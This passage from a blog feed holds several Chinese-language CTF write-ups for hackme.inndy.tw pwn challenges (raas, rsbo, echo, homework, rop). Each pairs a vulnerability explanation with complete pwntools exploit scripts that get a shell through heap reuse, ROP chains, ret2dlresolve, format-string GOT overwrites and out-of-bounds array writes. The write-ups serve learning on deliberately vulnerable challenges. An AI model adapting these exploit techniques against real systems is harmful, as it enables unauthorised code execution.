coding=utf-8from pwn import*context.log_level = "debug"p = process('./raas')system = 0x080484F0def createint(index,content): p.recvuntil("&gt;") p.sendline(str(1)) p.recvuntil("&gt;") p.sendline(str(index)) p.recvuntil("&gt;") p.sendline("1") p.recvuntil("&gt;") p.sendline(content)def createstr(index,size,content): p.recvuntil("&gt;") p.sendline(str(1)) p.recvuntil("&gt;") p.sendline(str(index)) p.recvuntil("&gt;") p.sendline("2") p.recvuntil("&gt;") p.sendline(str(size)) p.recvuntil("&gt;") p.sendline(content)def delete(index): p.recvuntil("&gt;") p.sendline(str(2)) p.recvuntil("&gt;") p.sendline(str(index))createint(0,"123")createint(1,"456")delete(0)delete(1)payload = "sh\x00\x00" + p32(system) createstr(2,12,payload)delete(0)gdb.attach(p)pause() p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rsbo-1 和 rsbo-2 writeup]]></title>
    <url>%2F2018%2F05%2F11%2F2018-5-11-rsbo-1-%E5%92%8C-rsbo-2-writeup%2F</url>
    <content type="text"><![CDATA[这两道题的文件是一样的，不过一个没要求getshell，一个要求getshll rsbo-1防护机制:只开启了堆栈不可执行题目hint: ROP, open, read很明显要要用ROP调用执行open()函数打开flag文件 然后用read()函数读取文件ida反编译代码** 它先执行init函数 ，打开“/home/ctf/flag”文件，然后读到buf上，再用随机数将buf的内容破坏，最后用memset将buf的内容清零。然后执行read_80_bytes()函数，这里存在溢出点，具体需要填充的字节为108，这个函数读取0x80个字节的内容到v5上，然后将返回值赋给v8,接下来的一个for循环会将会随机破坏内存中的数据，最后调用write()函数输出v5的内容 解题思路： 利用open()函数打开flag文件 利用read()函数将flag读到bss段 利用write()函数将flag打印出来 payload的构造填充的字符要用”\x00”,我看大佬的博客说好像是为了使v8的值为0，绕过循环 exp： 123456789101112131415161718192021222324252627#!/usr/bin/env python# coding=utf-8from pwn import *context.log_level="debug"p = process('./rsbo-1')#p = remote('hackme.inndy.tw', 7706)elf = ELF('./rsbo-1')start = 0x08048490open_plt = elf.symbols['open']read_plt = elf.symbols['read']write_plt = elf.symbols['write']log.info("open_plt --&gt;[%s]"%hex(open_plt))log.info("read_plt --&gt;[%s]"%hex(read_plt))log.info("read_plt --&gt;[%s]"%hex(write_plt))bss = elf.bss()offset = 108flag_add = 0x80487d0payload = '\x00'*offset + p32(open_plt) + p32(start) + p32(flag_add) + p32(0) p.send(payload)payload1 = '\x00'*offset + p32(read_plt) + p32(start) + p32(0x3) + p32(bss) + p32(0x60)p.send(payload1)payload2 = '\x00'*offset + p32(write_plt) +p32(0xdeadbeef) + p32(1) + p32(bss) + p32(0x60)p.send(payload2)p.interactive() rsbo2hint:Get shell please. Tips: stack migration 它要求我们获取目标主机的shell,同时还给了 migration的提示因为可供我们控制的溢出字节为20 不足以构造出我们getshell的rop链所以要将stack迁移到我们能控制的地方去 这题可以用泄露libc内存的做法来做也可以用_dl_runtime_resolve的做法我用的是_dl_runtime_resolve的做法，最近才学会，就想多练下 栈迁移用到的gadget是 pop_ebp 和 leave_ret这里栈迁移的地址不能是bss段的开头 很神奇，我也不知道为什么会这样我选的地址是bss+0x400 解题思路： migrate stack to bss + 0x400 构造调用read函数和_dl_runtime_resolve函数的rop链 在内存中写入_dl_runtime_resolve函数需要用到的参数 migrate stack 1payload = '\x00'*108 + p32(read_80_byte) + p32(pop_ebp) + p32(bss + 0x400) + p32(leave_ret) built rop chain 123payload = 'a'*4 + p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100)payload += rop.dl_resolve_call(base_stage+20,base_stage)payload += rop.fill(0x80,payload) write argument in base_stage 1234payload = rop.string('/bin/sh\x00')payload += rop.fill(20,payload)payload += rop.dl_resolve_data(base_stage + 20,'system')payload += rop.fill(100,payload) exp:12345678910111213141516171819202122232425262728293031323334from pwn import*import pwnlibimport roputilscontext.log_level = "debug"p = remote('hackme.inndy.tw', 7706)#p = process('./rsbo-1')elf = ELF('./rsbo-1')rop = roputils.ROP('./rsbo-1')offset = 108bss = elf.bss()base_stage = bss + 0x800print hex(base_stage)pop_ebp = 0x0804879fleave_ret = 0x080484f8pop3_ret = 0x0804879dstart = 0x0804867Fread_plt = elf.symbols['read']log.info("*********migrate stack***********")payload = '\x00'*offset + p32(0x804865C) + p32(pop_ebp) + p32(bss+0x400) + p32(leave_ret)p.send(payload)payload1 = 'a'*4 +p32(read_plt) + p32(pop3_ret) + p32(0) + p32(base_stage) + p32(100) payload1 += rop.dl_resolve_call(base_stage+20,base_stage)payload1 += rop.fill(0x7f,payload1) p.sendline(payload1)buf = '/bin/sh\x00'buf += rop.fill(20,buf)buf += rop.dl_resolve_data(base_stage + 20,'system')buf += rop.fill(100,buf)p.send(buf)p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[echo 和 echo2 writeup]]></title>
    <url>%2F2018%2F05%2F10%2F2018-5-10-echo-%E5%92%8C-echo2-writeup%2F</url>
    <content type="text"><![CDATA[hackme.inndy 的echo 和 echo2 echo防护机制： 32位的开启了NX的程序ida反编译一下： 很明显的一个格式化字符串漏洞，加上程序中存在system函数，所以可以将printf_got覆盖成system函数，再传入”/bin/sh” 来getshell这里我用了pwntools库中的fmtstr_payload()函数 exp:12345678910111213141516from pwn import*context.log_level= &quot;debug&quot;p = remote(&apos;hackme.inndy.tw&apos;,7711) #p = process(&apos;./echo&apos;)elf = ELF(&apos;./echo&apos;)system = elf.symbols[&apos;system&apos;]printf_got = elf.got[&apos;printf&apos;]bss = elf.bss()offset = 7payload = fmtstr_payload(offset,&#123;printf_got : system&#125;) # change the got of printf to systemp.send(payload)p.send(&quot;/bin/sh\x00&quot;)p.interactive() 结果： echo2防护机制： 发现程序开启了PIEPIE：是位置无关的可执行程序，用于生成位置无关的可执行程序，所谓位置无关的可执行程序，指的是，可执行程序的代码指令集可以被加载到任意位置，进程通过相对地址获取指令操作和数据，如果不是位置无关的可执行程序，则该可执行程序的代码指令集必须放到特定的位置才可运行进程。但是低两位字节是固定的，可以通过这个泄露出程序基地址 ida反编译： 发现这题的关键代码和前面那道题很相似，同样是一个格式化字符串漏洞，同样含有system函数，但是这一题是64位的并且开启了PIE的程序，所以需要先泄露出程序的基地址 gdb调试一番： 格式化字符串位于栈上，并且相对偏移为7查看栈上的内容： 程序的栈上有printf函数的返回地址和一些其他函数的返回地址所以可以通过泄露出printf函数的返回地址来计算出程序的基地址1program_base = leakmemory - offset 泄露libc_start_main+240的地址来算出libc的基地址通过在发送payload的语句后加一条gdb.attach(p)语句，进入调试界面，输入vmmap命令，计算出libc_base 和 libc_start_main+240的偏移，那就可以通过泄露出来的地址得到libc_base的地址了，因为不管PIE它的地址怎么变，lib_start_main的地址到libc_base的偏移是不会变的，同时可以得到libc_start_main在libc中的偏移，通过这个偏移可以查到程序的libc的版本libsearch 123libc_base = __libc_start_main +240 - offsetoffset = __libc_start_main +240 - 0x7ffff7a0d000libc_start_main_offset = offset - 240 查到libc的版本 有这么多 ，一般要再泄露多一个地址，比较精准，不过一个个试也可以，这里服务器用的libc版本是 9 获取了lib版本后就可以开始下一步了，我没有用system函数，我用one_gadget这个工具找到了execve(“/bin/sh”,null,environ)的偏移，然后将exit_got覆盖成了one_gadget的地址，因为exit也是libc库中的函数，所以只要覆盖低五位就可以了，我用”%hn”来改写地址的内容，一次修改两个字节，改写完后输入”exit”，就可以getshell 64位需要注意的是： 它的函数地址存在’\x00’截断，所以要将函数地址放到最后 控制好函数地址的相对偏移 exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env python# coding=utf-8from pwn import*context.log_level = &quot;debug&quot;p = remote(&quot;hackme.inndy.tw&quot;,7712)#p = process(&apos;./echo2&apos;)elf = ELF(&apos;./echo2&apos;)exit_got = elf.got[&apos;exit&apos;]def memleak(offset): payload = &apos;%&apos; + str(offset) + &quot;$p&quot; p.sendline(payload) data = p.recv()[0:-1] print data data = int(data,16) return datalog.info(&quot;************leak program base address************&quot;)_libc_csu_init = memleak(41)p_add = _libc_csu_init - 0xa03print &quot;base address --&gt;[%s]&quot;%hex(p_add)_libc_start_main_add = memleak(43) - 240print &quot;_libc_start_main_add --&gt;[%s]&quot;%hex(_libc_start_main_add)_libc_start_main_offset = 0x20740print &quot;_libc_start_main_offset --&gt; [%s] &quot;%hex(_libc_start_main_offset)libc_base = _libc_start_main_add - _libc_start_main_offsetprint &quot;libc_base --&gt; [%s]&quot;%hex(libc_base) one_gadget = 0xf0897#execve(&quot;/bin/sh&quot;,null,environ)#one_gadget = 0xf02a4print &quot;one_gadget --&gt; [%s]&quot;%hex(one_gadget)one_gadget_add = libc_base + one_gadgetprint &quot;on_gadget_add --&gt; [%s]&quot;%hex(one_gadget_add)log.info(&quot;*********write execve address to exit_got*******&quot;)exit_got = p_add + exit_gotprint &quot;exit_got --&gt; [%s]&quot;%hex(exit_got)hex_one_gadget = hex(one_gadget_add)add1 = str(int(int(hex_one_gadget[-4:],16))-19)add2 = str(int(int(hex_one_gadget[-8:-4],16))-19)add3 = str(int(int(hex_one_gadget[-12:-8],16))-19)payload1 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add1 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got)payload2 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add2 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got+2)payload3 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add3 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got+4)p.sendline(payload1)p.sendline(payload2)p.sendline(payload3)p.send(&quot;exit\n&quot;)p.interactive() 结果： 写echo2的时候参考了大佬的writeup]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[homework writeup]]></title>
    <url>%2F2018%2F05%2F09%2F2018-5-9-homework-writeup%2F</url>
    <content type="text"><![CDATA[题目：homework (hackme.inndy.tw)hint: Index out bound ,return address ,并且给了程序源码题目防护机制： 开启了NX和Canary源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; char name[1024]; void call_me_maybe() &#123; system("/bin/sh"); &#125; void unbuffer_io() &#123; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); &#125; void set_timeout() &#123; alarm(120); &#125; void ask_name() &#123; printf("What's your name? "); gets(name); &#125; void say_goodbye() &#123; printf("Goodbye, %s\n", name); &#125; void run_program() &#123; int arr[10], i, v, act; for(i = 0; i &lt; 10; i++) arr[i] = 0; while(1) &#123; puts("0 &gt; exit"); puts("1 &gt; edit number"); puts("2 &gt; show number"); puts("3 &gt; sum"); puts("4 &gt; dump all numbers"); printf(" &gt; "); scanf("%d", &amp;act); switch(act) &#123; case 0: return; case 1: printf("Index to edit: "); scanf("%d", &amp;i); printf("How many? "); scanf("%d", &amp;v); arr[i] = v; break; case 2: printf("Index to show: "); scanf("%d", &amp;i); printf("arr[%d] is %d\n", i, arr[i]); break; case 3: v = 0; for(i = 0; i &lt; 10; i++) v += arr[i]; printf("Sum is %d\n", v); break; case 4: for(i = 0; i &lt; 10; i++) printf("arr[%d] is %d\n", i, arr[i]); break; &#125; &#125; &#125; int main() &#123; set_timeout(); unbuffer_io(); ask_name(); run_program(); say_goodbye(); return 0; &#125; 通过阅读它的源码可以发现它对数组的下标没有很好的限制，我们可以通过输入一个数组下标和值来改表数组的值，如果输入的数组下标超出了程序数组的大小，就可以改写内存中的值。同时，它程序中存在system函数，结合题目的hint可以推断出这是一个数组下标溢出题，通过下标溢出，将返回地址覆盖成system函数来获取shell 数组下标溢出原理：因为c语言不会检测数组下标，所以如果我们给数组一个超出它大小的下标，就会照成数组越界。如果是想数组中写入数据的话，就会造成数据写入到不属于数组的地方，或者说如果读取数据的话，就会读取到别的地方的数据。因为数组地址是自低往高增长，而栈的地址是自高向下降低，所以如果我们将数组下标根据栈内的空间的分布，设置为特定的值，就可以修改或者是查看我们想要查看的地址的值。比如将返回地址设置成我们想要调用函数的地址。 具体可以参考这篇博客 所以只要找到返回地址对应着数组的位置是什么，再通过edit功能将返回地址修改为system函数的地址来获取shell 数组在栈中的位置是0x34,和返回地址的距离是0x34+8所以输入的数组下标为14 exp:123456789101112131415161718from pwn import* context.log_level="debug" #p = process('./homework') p = remote('hackme.inndy.tw', 7701) p.recvuntil("What's your name?") p.sendline('aaaa') p.recvuntil(" &gt; ") p.sendline("1") p.recv() p.sendline("14") p.recvuntil("How many?") p.sendline(str(0x080485fb)) p.recv()p.sendline("0")#make program return to target function p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rop 和 rop2 writeup]]></title>
    <url>%2F2018%2F05%2F09%2F2018-5-9-rop-%E5%92%8C-rop2-writeup%2F</url>
    <content type="text"><![CDATA[题目来源：国外的一个ctf平台hackme rophint: ROP buffer overflow防护机制： 拖到IDA反编译一下 可以看到有很多函数 ，不管是用到的还是没用的都有，说明它编译时用的是静态连接我们可以通过ROPgadget 来直接构造ropchain命令为 ROPgadget –binary rop –ropchain 栈的大小可以通过peda的pattern search 来找到先生成 长度为100的字符串 pattern create 100然后执行程序 栈的大小为12exp:123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import * from struct import pack sh = remote('hackme.inndy.tw',7704) junk = 'a'*12 + "BBBB" # junk + ebp p = junk p += pack('&lt;I', 0x0806ecda) # pop edx ; ret p += pack('&lt;I', 0x080ea060) # @ .data p += pack('&lt;I', 0x080b8016) # pop eax ; ret p += '/bin' p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack('&lt;I', 0x0806ecda) # pop edx ; ret p += pack('&lt;I', 0x080ea064) # @ .data + 4 p += pack('&lt;I', 0x080b8016) # pop eax ; ret p += '//sh' p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack('&lt;I', 0x0806ecda) # pop edx ; ret p += pack('&lt;I', 0x080ea068) # @ .data + 8 p += pack('&lt;I', 0x080492d3) # xor eax, eax ; ret p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack('&lt;I', 0x080481c9) # pop ebx ; ret p += pack('&lt;I', 0x080ea060) # @ .data p += pack('&lt;I', 0x080de769) # pop ecx ; ret p += pack('&lt;I', 0x080ea068) # @ .data + 8 p += pack('&lt;I', 0x0806ecda) # pop edx ; ret p += pack('&lt;I', 0x080ea068) # @ .data + 8 p += pack('&lt;I', 0x080492d3) # xor eax, eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0806c943) # int 0x80 sh.sendline(p) sh.interactive() rop2hint：ROPgadget not working anymore说明不可以再通过ROPgadget来获取ropchain了检查下防护机制 只开启了NX 简单运行了一下程序： 程序要求你输入一串字符串 然后打印出了一堆东西 将程序拖到ida中，来一手f5大法 发现了syscall函数 ，查了一下发现程序中的syscall(4,1,&amp;v4,42) 和syscall(3,0,&amp;v1,1024) 分别调用了write()函数和read函数的系统调用 解题思路：将syscall中的第一个参数设置为execve()函数的调用号，第二个 参数设置为“/bin/sh”参数的地址 来执行execve()获取shell execve()函数的系统调用号 为0xb exp:123456789101112131415161718from pwn import* p = remote('hackme.inndy.tw',7703) elf = ELF('./rop2') bss = elf.bss() syscall = elf.symbols['syscall'] overflow = elf.symbols['overflow'] p.recv() payload = 'a'*0xC + 'bbbb' + p32(syscall) + p32(overflow) # junk + target_address + return_address payload += p32(3) + p32(0) + p32(bss) + p32(8) #syscall(3,0,bss_add,8) p.send(payload) p.send("/bin/sh\x00") payload1 = 'a'*0xc + "BBBB" + p32(syscall) payload1 += p32(overflow)+ p32(0xb) + p32(bss) + p32(0) + p32(0) #syscall(0xb,bss_add,0,0) = execve("bin/sh",0,0) p.send(payload1) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
